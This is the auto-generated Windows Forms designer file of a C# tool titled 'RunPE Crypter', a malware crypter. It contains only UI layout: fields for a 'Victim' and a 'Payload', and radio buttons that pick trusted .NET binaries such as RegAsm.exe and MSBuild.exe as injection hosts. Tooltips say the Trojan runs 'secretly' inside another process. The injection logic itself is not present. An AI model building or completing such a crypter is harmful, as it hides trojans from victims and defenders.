namespace MyCrypter
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.btnBrowse = new System.Windows.Forms.Button();
            this.txtFile = new System.Windows.Forms.TextBox();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.radioButton2 = new System.Windows.Forms.RadioButton();
            this.radioButton1 = new System.Windows.Forms.RadioButton();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.rbAddInProcess = new System.Windows.Forms.RadioButton();
            this.rbCvtRes = new System.Windows.Forms.RadioButton();
            this.rbVBC = new System.Windows.Forms.RadioButton();
            this.rbMSBuild = new System.Windows.Forms.RadioButton();
            this.rbAppLaunch = new System.Windows.Forms.RadioButton();
            this.rbInstallUtil = new System.Windows.Forms.RadioButton();
            this.rbRegSvcs = new System.Windows.Forms.RadioButton();
            this.rbRegAsm = new System.Windows.Forms.RadioButton();
            this.btnCrypt = new System.Windows.Forms.Button();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.button1 = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.SuspendLayout();
            // 
            // btnBrowse
            // 
            this.btnBrowse.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnBrowse.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnBrowse.ForeColor = System.Drawing.Color.White;
            this.btnBrowse.Location = new System.Drawing.Point(405, 47);
            this.btnBrowse.Name = "btnBrowse";
            this.btnBrowse.Size = new System.Drawing.Size(67, 27);
            this.btnBrowse.TabIndex = 0;
            this.btnBrowse.Text = "Open";
            this.toolTip1.SetToolTip(this.btnBrowse, "The Trojan file will be injected into the chosen process below.\r\nIt will seem nor" +
        "mal as our Victim will be seemingly be run.");
            this.btnBrowse.UseVisualStyleBackColor = true;
            this.btnBrowse.Click += new System.EventHandler(this.btnBrowse_Click);
            // 
            // txtFile
            // 
            this.txtFile.BackColor = System.Drawing.Color.Black;
            this.txtFile.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtFile.Font = new System.Drawing.Font("Segoe UI Semibold", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtFile.ForeColor = System.Drawing.Color.White;
            this.txtFile.Location = new System.Drawing.Point(64, 47);
            this.txtFile.Name = "txtFile";
            this.txtFile.ReadOnly = true;
            this.txtFile.Size = new System.Drawing.Size(335, 27);
            this.txtFile.TabIndex = 1;
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.radioButton2);
            this.groupBox1.Controls.Add(this.radioButton1);
            this.groupBox1.Controls.Add(this.textBox2);
            this.groupBox1.Controls.Add(this.label4);
            this.groupBox1.Controls.Add(this.rbAddInProcess);
            this.groupBox1.Controls.Add(this.rbCvtRes);
            this.groupBox1.Controls.Add(this.rbVBC);
            this.groupBox1.Controls.Add(this.rbMSBuild);
            this.groupBox1.Controls.Add(this.rbAppLaunch);
            this.groupBox1.Controls.Add(this.rbInstallUtil);
            this.groupBox1.Controls.Add(this.rbRegSvcs);
            this.groupBox1.Controls.Add(this.rbRegAsm);
            this.groupBox1.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox1.ForeColor = System.Drawing.Color.White;
            this.groupBox1.Location = new System.Drawing.Point(9, 93);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(486, 127);
            this.groupBox1.TabIndex = 2;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Trojan injection settings (Red = Native / White = .NET )";
            this.groupBox1.Enter += new System.EventHandler(this.groupBox1_Enter);
            // 
            // radioButton2
            // 
            this.radioButton2.AutoSize = true;
            this.radioButton2.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.radioButton2.ForeColor = System.Drawing.Color.Red;
            this.radioButton2.Location = new System.Drawing.Point(413, 45);
            this.radioButton2.Name = "radioButton2";
            this.radioButton2.Size = new System.Drawing.Size(67, 17);
            this.radioButton2.TabIndex = 16;
            this.radioButton2.Text = "VBC.exe";
            this.radioButton2.UseVisualStyleBackColor = true;
            // 
            // radioButton1
            // 
            this.radioButton1.AutoSize = true;
            this.radioButton1.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.radioButton1.Location = new System.Drawing.Point(11, 70);
            this.radioButton1.Name = "radioButton1";
            this.radioButton1.Size = new System.Drawing.Size(96, 17);
            this.radioButton1.TabIndex = 14;
            this.radioButton1.TabStop = true;
            this.radioButton1.Text = "Custom Inject";
            this.radioButton1.UseVisualStyleBackColor = true;
            this.radioButton1.CheckedChanged += new System.EventHandler(this.radioButton1_CheckedChanged);
            // 
            // textBox2
            // 
            this.textBox2.BackColor = System.Drawing.Color.Black;
            this.textBox2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.textBox2.ForeColor = System.Drawing.Color.White;
            this.textBox2.Location = new System.Drawing.Point(11, 95);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new System.Drawing.Size(464, 22);
            this.textBox2.TabIndex = 12;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(113, 72);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(317, 13);
            this.label4.TabIndex = 11;
            this.label4.Text = "Inject into custom executable in .net framework. (With .exe)\r\n";
            this.label4.Click += new System.EventHandler(this.label4_Click);
            // 
            // rbAddInProcess
            // 
            this.rbAddInProcess.AutoSize = true;
            this.rbAddInProcess.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.rbAddInProcess.ForeColor = System.Drawing.Color.White;
            this.rbAddInProcess.Location = new System.Drawing.Point(107, 45);
            this.rbAddInProcess.Name = "rbAddInProcess";
            this.rbAddInProcess.Size = new System.Drawing.Size(81, 17);
            this.rbAddInProcess.TabIndex = 10;
            this.rbAddInProcess.Text = "CasPol.exe";
            this.rbAddInProcess.UseVisualStyleBackColor = true;
            // 
            // rbCvtRes
            // 
            this.rbCvtRes.AutoSize = true;
            this.rbCvtRes.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.rbCvtRes.ForeColor = System.Drawing.Color.Red;
            this.rbCvtRes.Location = new System.Drawing.Point(326, 45);
            this.rbCvtRes.Name = "rbCvtRes";
            this.rbCvtRes.Size = new System.Drawing.Size(81, 17);
            this.rbCvtRes.TabIndex = 9;
            this.rbCvtRes.Text = "CvtRes.exe";
            this.rbCvtRes.UseVisualStyleBackColor = true;
            // 
            // rbVBC
            // 
            this.rbVBC.AutoSize = true;
            this.rbVBC.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.rbVBC.ForeColor = System.Drawing.Color.White;
            this.rbVBC.Location = new System.Drawing.Point(194, 45);
            this.rbVBC.Name = "rbVBC";
            this.rbVBC.Size = new System.Drawing.Size(129, 17);
            this.rbVBC.TabIndex = 8;
            this.rbVBC.Text = "AddInProcess32.exe";
            this.rbVBC.UseVisualStyleBackColor = true;
            this.rbVBC.CheckedChanged += new System.EventHandler(this.rbVBC_CheckedChanged);
            // 
            // rbMSBuild
            // 
            this.rbMSBuild.AutoSize = true;
            this.rbMSBuild.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.rbMSBuild.ForeColor = System.Drawing.Color.White;
            this.rbMSBuild.Location = new System.Drawing.Point(11, 45);
            this.rbMSBuild.Name = "rbMSBuild";
            this.rbMSBuild.Size = new System.Drawing.Size(90, 17);
            this.rbMSBuild.TabIndex = 7;
            this.rbMSBuild.Text = "MSBuild.exe";
            this.rbMSBuild.UseVisualStyleBackColor = true;
            this.rbMSBuild.CheckedChanged += new System.EventHandler(this.rbMSBuild_CheckedChanged);
            // 
            // rbAppLaunch
            // 
            this.rbAppLaunch.AutoSize = true;
            this.rbAppLaunch.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.rbAppLaunch.ForeColor = System.Drawing.Color.White;
            this.rbAppLaunch.Location = new System.Drawing.Point(374, 22);
            this.rbAppLaunch.Name = "rbAppLaunch";
            this.rbAppLaunch.Size = new System.Drawing.Size(106, 17);
            this.rbAppLaunch.TabIndex = 6;
            this.rbAppLaunch.Text = "AppLaunch.exe";
            this.rbAppLaunch.UseVisualStyleBackColor = true;
            this.rbAppLaunch.CheckedChanged += new System.EventHandler(this.rbAppLaunch_CheckedChanged);
            // 
            // rbInstallUtil
            // 
            this.rbInstallUtil.AutoSize = true;
            this.rbInstallUtil.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.rbInstallUtil.ForeColor = System.Drawing.Color.White;
            this.rbInstallUtil.Location = new System.Drawing.Point(252, 22);
            this.rbInstallUtil.Name = "rbInstallUtil";
            this.rbInstallUtil.Size = new System.Drawing.Size(95, 17);
            this.rbInstallUtil.TabIndex = 5;
            this.rbInstallUtil.Text = "InstallUtil.exe";
            this.rbInstallUtil.UseVisualStyleBackColor = true;
            // 
            // rbRegSvcs
            // 
            this.rbRegSvcs.AutoSize = true;
            this.rbRegSvcs.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.rbRegSvcs.ForeColor = System.Drawing.Color.White;
            this.rbRegSvcs.Location = new System.Drawing.Point(132, 22);
            this.rbRegSvcs.Name = "rbRegSvcs";
            this.rbRegSvcs.Size = new System.Drawing.Size(88, 17);
            this.rbRegSvcs.TabIndex = 4;
            this.rbRegSvcs.Text = "RegSvcs.exe";
            this.rbRegSvcs.UseVisualStyleBackColor = true;
            this.rbRegSvcs.CheckedChanged += new System.EventHandler(this.rbRegSvcs_CheckedChanged);
            // 
            // rbRegAsm
            // 
            this.rbRegAsm.AutoSize = true;
            this.rbRegAsm.Checked = true;
            this.rbRegAsm.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.rbRegAsm.ForeColor = System.Drawing.Color.White;
            this.rbRegAsm.Location = new System.Drawing.Point(11, 22);
            this.rbRegAsm.Name = "rbRegAsm";
            this.rbRegAsm.Size = new System.Drawing.Size(89, 17);
            this.rbRegAsm.TabIndex = 3;
            this.rbRegAsm.TabStop = true;
            this.rbRegAsm.Text = "RegAsm.exe";
            this.rbRegAsm.UseVisualStyleBackColor = true;
            this.rbRegAsm.CheckedChanged += new System.EventHandler(this.rbRegAsm_CheckedChanged);
            // 
            // btnCrypt
            // 
            this.btnCrypt.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnCrypt.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnCrypt.ForeColor = System.Drawing.Color.White;
            this.btnCrypt.Location = new System.Drawing.Point(8, 16);
            this.btnCrypt.Name = "btnCrypt";
            this.btnCrypt.Size = new System.Drawing.Size(472, 52);
            this.btnCrypt.TabIndex = 3;
            this.btnCrypt.Text = "Build";
            this.btnCrypt.UseVisualStyleBackColor = true;
            this.btnCrypt.Click += new System.EventHandler(this.btnCrypt_Click);
            // 
            // textBox1
            // 
            this.textBox1.BackColor = System.Drawing.Color.Black;
            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.textBox1.Font = new System.Drawing.Font("Segoe UI Semibold", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox1.ForeColor = System.Drawing.Color.White;
            this.textBox1.Location = new System.Drawing.Point(64, 15);
            this.textBox1.Name = "textBox1";
            this.textBox1.ReadOnly = true;
            this.textBox1.Size = new System.Drawing.Size(335, 27);
            this.textBox1.TabIndex = 6;
            // 
            // button1
            // 
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.Color.White;
            this.button1.Location = new System.Drawing.Point(405, 15);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(67, 28);
            this.button1.TabIndex = 5;
            this.button1.Text = "Open";
            this.toolTip1.SetToolTip(this.button1, "The Victim file will be injected into the final payload as if it was itself.\r\nYou" +
        "r Trojan will be run too, injected into another process secretly...");
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(6, 19);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(52, 17);
            this.label1.TabIndex = 7;
            this.label1.Text = "Victim:";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.Location = new System.Drawing.Point(4, 51);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(61, 17);
            this.label2.TabIndex = 8;
            this.label2.Text = "Payload:";
            // 
            // toolTip1
            // 
            this.toolTip1.AutoPopDelay = 8000;
            this.toolTip1.BackColor = System.Drawing.Color.Black;
            this.toolTip1.ForeColor = System.Drawing.Color.Red;
            this.toolTip1.InitialDelay = 500;
            this.toolTip1.IsBalloon = true;
            this.toolTip1.ReshowDelay = 100;
            this.toolTip1.ToolTipTitle = "Information...";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.btnCrypt);
            this.groupBox2.ForeColor = System.Drawing.Color.White;
            this.groupBox2.Location = new System.Drawing.Point(9, 226);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(486, 74);
            this.groupBox2.TabIndex = 10;
            this.groupBox2.TabStop = false;
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.label1);
            this.groupBox3.Controls.Add(this.textBox1);
            this.groupBox3.Controls.Add(this.label2);
            this.groupBox3.Controls.Add(this.btnBrowse);
            this.groupBox3.Controls.Add(this.txtFile);
            this.groupBox3.Controls.Add(this.button1);
            this.groupBox3.ForeColor = System.Drawing.Color.White;
            this.groupBox3.Location = new System.Drawing.Point(9, 3);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(486, 84);
            this.groupBox3.TabIndex = 11;
            this.groupBox3.TabStop = false;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(503, 308);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "RunPE Crypter @MMLo7";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Button btnBrowse;
        private System.Windows.Forms.TextBox txtFile;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.RadioButton rbAppLaunch;
        private System.Windows.Forms.RadioButton rbInstallUtil;
        private System.Windows.Forms.RadioButton rbRegSvcs;
        private System.Windows.Forms.RadioButton rbRegAsm;
        private System.Windows.Forms.Button btnCrypt;
        private System.Windows.Forms.RadioButton rbAddInProcess;
        private System.Windows.Forms.RadioButton rbCvtRes;
        private System.Windows.Forms.RadioButton rbVBC;
        private System.Windows.Forms.RadioButton rbMSBuild;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.ToolTip toolTip1;
        private System.Windows.Forms.RadioButton radioButton1;
        private System.Windows.Forms.TextBox textBox2;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.RadioButton radioButton2;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.GroupBox groupBox3;
    }
}

